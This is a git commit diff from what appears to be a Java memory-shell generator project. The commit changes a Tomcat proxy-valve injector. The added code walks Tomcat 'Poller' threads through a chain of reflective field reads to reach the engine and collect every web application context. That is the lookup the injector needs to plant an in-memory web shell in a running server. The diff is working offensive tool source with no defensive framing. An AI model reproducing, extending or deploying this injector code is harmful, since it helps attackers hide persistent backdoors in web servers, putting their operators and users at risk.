b412e9206d5388ff4837e88a6a3b8c606d2f572c
ReaJason <reajason1225@gmail.com>
2025-12-15 21:03:46 +0800

    fix: context not found in fr v11

--- generator/src/main/java/com/reajason/javaweb/memshell/injector/tomcat/TomcatProxyValveInjector.java
+++ generator/src/main/java/com/reajason/javaweb/memshell/injector/tomcat/TomcatProxyValveInjector.java
@@ -100,11 +100,23 @@ public class TomcatProxyValveInjector implements InvocationHandler {
         Set<Object> contexts = new HashSet<Object>();
         Set<Thread> threads = Thread.getAllStackTraces().keySet();
         for (Thread thread : threads) {
-            if (thread.getName().contains("ContainerBackgroundProcessor")) {
+            String threadName = thread.getName();
+            if (threadName.contains("ContainerBackgroundProcessor")) {
                 Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
                 for (Object value : childrenMap.values()) {
                     Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
                     contexts.addAll(children.values());
+                }
+            } else if (threadName.contains("Poller") && !threadName.contains("ajp")) {
+                try {
+                    Object proto = getFieldValue(getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "handler"), "proto");
+                    Object engine = getFieldValue(getFieldValue(getFieldValue(getFieldValue(proto, "adapter"), "connector"), "service"), "engine");
+                    Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(engine, "children");
+                    for (Object value : childrenMap.values()) {
+                        Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
+                        contexts.addAll(children.values());
+                    }
+                } catch (Exception ignored) {
                 }
             } else if (thread.getContextClassLoader() != null) {
                 String name = thread.getContextClassLoader().getClass().getSimpleName();
